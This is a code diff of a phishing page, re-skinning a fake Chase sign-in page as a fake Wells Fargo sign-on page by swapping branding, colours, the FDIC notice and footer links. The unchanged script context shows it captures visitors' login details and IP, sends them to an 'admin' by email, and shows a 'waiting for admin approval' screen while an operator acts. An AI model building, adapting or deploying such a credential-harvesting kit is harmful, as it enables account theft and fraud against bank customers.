@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chase - Sign In</title>
+    <title>Wells Fargo Sign On</title>
     <style>
         * {
             box-sizing: border-box;
@@ -13,7 +13,7 @@
         }
 
         body {
-            background-color: #f0f2f5;
+            background-color: #ffffff;
             color: #333333;
             display: flex;
             justify-content: center;
@@ -28,70 +28,42 @@
             flex-direction: column;
         }
 
-        /* ===== CHASE HEADER ===== */
+        /* Header */
         .header {
-            background: linear-gradient(135deg, #1171bc 0%, #0a4b7a 100%);
+            background-color: #d71e28;
             color: white;
-            padding: 16px 20px;
+            padding: 14px 16px;
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
+            position: relative;
+            border-bottom: 3px solid #ffcc00;
         }
 
         .logo {
             font-family: "Georgia", serif;
             font-weight: bold;
-            font-size: 24px;
+            font-size: 20px;
             letter-spacing: 1px;
-            color: #ffffff;
-        }
-
-        .header-right {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-        }
-
-        .help-icon {
-            width: 28px;
-            height: 28px;
-            border: 2px solid rgba(255,255,255,0.8);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 16px;
-            font-weight: 700;
-            color: #ffffff;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .help-icon:hover {
-            background: rgba(255,255,255,0.15);
+            text-transform: uppercase;
         }
 
         .menu-icon {
+            position: absolute;
+            right: 16px;
             display: flex;
             flex-direction: column;
             gap: 4px;
             cursor: pointer;
-            padding: 4px;
         }
 
         .menu-icon div {
             width: 22px;
             height: 2px;
             background-color: white;
-            border-radius: 1px;
         }
 
-        .menu-icon:hover div {
-            background: #ffcc00;
-        }
-
-        /* ===== CONTENT ===== */
+        /* Content */
         .content {
             padding: 32px 24px 0 24px;
             display: flex;
@@ -125,8 +97,7 @@
         }
 
         .input-field:focus {
-            border-color: #1171bc;
-            box-shadow: 0 0 0 3px rgba(17, 113, 188, 0.12);
+            border-color: #d71e28;
         }
 
         .input-field::placeholder {
@@ -148,7 +119,7 @@
             right: 16px;
             top: 50%;
             transform: translateY(-50%);
-            color: #1171bc;
+            color: #3b2b73;
             font-weight: 600;
             font-size: 15px;
             cursor: pointer;
@@ -159,7 +130,7 @@
         }
 
         .show-btn:hover {
-            color: #0a4b7a;
+            color: #1a1a5e;
         }
 
         .checkbox-container {
@@ -177,7 +148,6 @@
             border-radius: 4px;
             border: 1px solid #767676;
             cursor: pointer;
-            accent-color: #1171bc;
         }
 
         .checkbox-label {
@@ -194,14 +164,14 @@
             width: 100%;
         }
 
-        /* ===== BUTTONS ===== */
+        /* Buttons */
         .btn-sign-on {
             width: 100%;
             height: 48px;
-            background-color: #1171bc;
+            background-color: #d71e28;
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 24px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
@@ -210,7 +180,7 @@
         }
 
         .btn-sign-on:hover:not(:disabled) {
-            background-color: #0a4b7a;
+            background-color: #b81820;
         }
 
         .btn-sign-on:disabled {
@@ -231,7 +201,7 @@
             background-color: transparent;
             color: #262626;
             border: 1px solid #262626;
-            border-radius: 8px;
+            border-radius: 24px;
             font-size: 16px;
             font-weight: 600;
             display: flex;
@@ -256,7 +226,7 @@
         }
 
         .forgot-link {
-            color: #1171bc;
+            color: #3b2b73;
             font-size: 15px;
             font-weight: 600;
             text-decoration: none;
@@ -270,7 +240,7 @@
             text-decoration: underline;
         }
 
-        /* ===== INVESTMENT BOX ===== */
+        /* Investment Box */
         .investment-box {
             margin-top: 40px;
             width: 100%;
@@ -314,45 +284,26 @@
             line-height: 1.4;
         }
 
-        /* ===== FOOTER ===== */
+        /* Footer */
         .footer {
-            background-color: #f7f8fa;
+            background-color: #f7f5f2;
             padding: 24px 20px 32px 20px;
             width: 100%;
-            border-top: 1px solid #e8e8e8;
-        }
-
-        .social-icons {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-bottom: 20px;
-        }
-
-        .social-icons a {
-            color: #59636e;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 14px;
-            transition: color 0.2s;
-        }
-
-        .social-icons a:hover {
-            color: #1171bc;
+            border-top: 1px solid #e2ded8;
         }
 
         .footer-links {
             display: grid;
             grid-template-columns: 1fr 1fr;
             column-gap: 16px;
-            row-gap: 12px;
-            margin-bottom: 20px;
+            row-gap: 20px;
+            margin-bottom: 24px;
         }
 
         .footer-links a {
             color: #333333;
             text-decoration: none;
-            font-size: 13px;
+            font-size: 13.5px;
             line-height: 1.35;
         }
 
@@ -363,23 +314,12 @@
         .footer-divider {
             height: 1px;
             background-color: #d9d4cd;
-            margin-bottom: 16px;
-        }
-
-        .housing-info {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            font-size: 13px;
-            color: #333333;
-            margin-bottom: 8px;
+            margin-bottom: 20px;
         }
 
         .copyright {
-            font-size: 12px;
-            color: #6b6b6b;
-            text-align: center;
+            font-size: 12.5px;
+            color: #333333;
             line-height: 1.4;
         }
 
@@ -449,10 +389,10 @@
         .restart-btn {
             margin-top: 20px;
             padding: 10px 24px;
-            background: #1171bc;
+            background: #d71e28;
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 24px;
             cursor: pointer;
             font-size: 16px;
             font-weight: 600;
@@ -460,16 +400,16 @@
         }
 
         .restart-btn:hover {
-            background: #0a4b7a;
+            background: #b81820;
         }
 
-        /* ===== TOGGLE PASSWORD ===== */
+        /* Wells Fargo "Show" / "Hide" button */
         .toggle-password-btn {
             position: absolute;
             right: 16px;
             top: 50%;
             transform: translateY(-50%);
-            color: #1171bc;
+            color: #3b2b73;
             font-weight: 600;
             font-size: 15px;
             cursor: pointer;
@@ -480,103 +420,24 @@
         }
 
         .toggle-password-btn:hover {
-            color: #0a4b7a;
-        }
-
-        /* ===== RESPONSIVE ===== */
-        @media (max-width: 480px) {
-            .content {
-                padding: 20px 16px 0 16px;
-            }
-
-            .greeting {
-                font-size: 28px;
-            }
-
-            .logo {
-                font-size: 20px;
-            }
-
-            .footer-links {
-                grid-template-columns: 1fr 1fr;
-                gap: 8px 12px;
-            }
-
-            .footer-links a {
-                font-size: 12px;
-            }
-
-            .social-icons {
-                gap: 14px;
-            }
-
-            .input-field {
-                height: 44px;
-                font-size: 15px;
-            }
-
-            .btn-sign-on,
-            .btn-passkey {
-                height: 44px;
-                font-size: 15px;
-            }
-        }
-
-        @media (max-width: 380px) {
-            .greeting {
-                font-size: 24px;
-            }
-
-            .logo {
-                font-size: 18px;
-            }
-
-            .header {
-                padding: 12px 16px;
-            }
-
-            .help-icon {
-                width: 24px;
-                height: 24px;
-                font-size: 14px;
-            }
-
-            .menu-icon div {
-                width: 18px;
-                height: 2px;
-            }
-
-            .input-field {
-                height: 40px;
-                font-size: 14px;
-            }
-
-            .btn-sign-on,
-            .btn-passkey {
-                height: 40px;
-                font-size: 14px;
-            }
+            color: #1a1a5e;
         }
     </style>
 </head>
 <body>
 
 <div class="mobile-container">
-
-    <!-- ===== CHASE HEADER ===== -->
+    <!-- HEADER -->
     <header class="header">
-        <div class="logo">CHASE</div>
-        <div class="header-right">
-            <div class="help-icon">?</div>
-            <div class="menu-icon">
-                <div></div>
-                <div></div>
-                <div></div>
-            </div>
+        <div class="logo">WELLS FARGO</div>
+        <div class="menu-icon">
+            <div></div>
+            <div></div>
+            <div></div>
         </div>
     </header>
 
-    <!-- ===== MAIN CONTENT ===== -->
+    <!-- MAIN CONTENT -->
     <main class="content">
         <h1 class="greeting" id="greetingText">Good evening</h1>
 
@@ -699,7 +560,7 @@
                 <h2 style="font-family: Georgia, serif; font-size: 24px; color: #262626;">Waiting for Admin Approval</h2>
                 <p style="color: #595959; margin-top: 8px;">Your information has been sent to the administrator.</p>
                 <p style="color: #595959;">Please wait while the admin reviews your request...</p>
-                <p id="waitingStatus" style="color: #1171bc; font-weight:600; margin-top:12px;">Loading...</p>
+                <p id="waitingStatus" style="color: #3b2b73; font-weight:600; margin-top:12px;">Loading...</p>
                 <button type="button" class="restart-btn" onclick="restart()" style="margin-top:20px;">Start Over</button>
             </div>
         </div>
@@ -730,52 +591,35 @@
             </div>
 
             <p class="fdic-notice">
-                Deposit products offered by JPMorgan Chase Bank, N.A. Member FDIC.
+                Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
             </p>
         </div>
     </main>
 
-    <!-- ===== CHASE FOOTER ===== -->
+    <!-- FOOTER -->
     <footer class="footer">
-        <div class="social-icons">
-            <a href="#">FB</a>
-            <a href="#">IG</a>
-            <a href="#">X</a>
-            <a href="#">YT</a>
-            <a href="#">IN</a>
-        </div>
-
         <div class="footer-links">
-            <a href="#">Contact us</a>
-            <a href="#">Privacy &amp; security</a>
-            <a href="#">Terms of use</a>
-            <a href="#">Accessibility</a>
-            <a href="#">SAFE Act: Chase Mortgage Loan Originators</a>
-            <a href="#">Fair Lending</a>
-            <a href="#">About Chase</a>
-            <a href="#">J.P. Morgan</a>
-            <a href="#">JPMorgan Chase &amp; Co.</a>
-            <a href="#">Careers</a>
-            <a href="#">Español</a>
-            <a href="#">Chase Canada</a>
-            <a href="#">Site map</a>
-            <span style="color: #333; font-size: 13px;">Member FDIC</span>
+            <a href="#">About Wells Fargo</a>
+            <a href="#">Report Email Fraud</a>
+            <a href="#">Online Access Agreement</a>
+            <a href="#">Security Center</a>
+            <a href="#">Privacy, Cookies, Security & Legal</a>
+            <a href="#">Sitemap</a>
+            <a href="#">Do not sell or share my personal information</a>
+            <a href="#">Give Us Feedback</a>
+            <a href="#">Notice of Data Collection</a>
         </div>
 
         <div class="footer-divider"></div>
 
-        <div class="housing-info">
-            <span>⌂</span> Equal Housing Opportunity
-        </div>
-
         <div class="copyright">
-            &copy; 2026 JPMorganChase
+            &copy; 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
         </div>
     </footer>
 </div>
 
 <!-- ========================================== -->
-<!-- JAVASCRIPT - YOUR EXACT WORKING LOGIC -->
+<!-- JAVASCRIPT - MERGED LOGIC -->
 <!-- ========================================== -->
 <script>
     // ==========================================
@@ -795,7 +639,7 @@
         .catch(() => { userIp = '(could not detect)'; });
 
     // ==========================================
-    // TOGGLE PASSWORD VISIBILITY
+    // TOGGLE PASSWORD VISIBILITY - Wells Fargo Style
     // ==========================================
     function setupToggle(btnId, inputId) {
         const btn = document.getElementById(btnId);
@@ -825,6 +669,7 @@
         const el = document.getElementById(stepId);
         if (el) el.classList.add('active');
 
+        // Hide bottom content for certain steps
         const bottom = document.getElementById('bottomContent');
         if (bottom) {
             if (stepId === 'congrats' || stepId === 'waiting') {
@@ -889,7 +734,9 @@
                 } else {
                     document.getElementById('waitingStatus').textContent = 'Still waiting for admin approval...';
                 }
-            } catch (e) {}
+            } catch (e) {
+                // Silent fail
+            }
         }, 3000);
     }
 
@@ -1077,7 +924,7 @@
         }
     });
 
-    console.log('✅ Chase Sign-In Page Loaded');
+    console.log('✅ Wells Fargo Sign-In Page Loaded');
     console.log('📧 All data sent to admin email');
 </script>
 
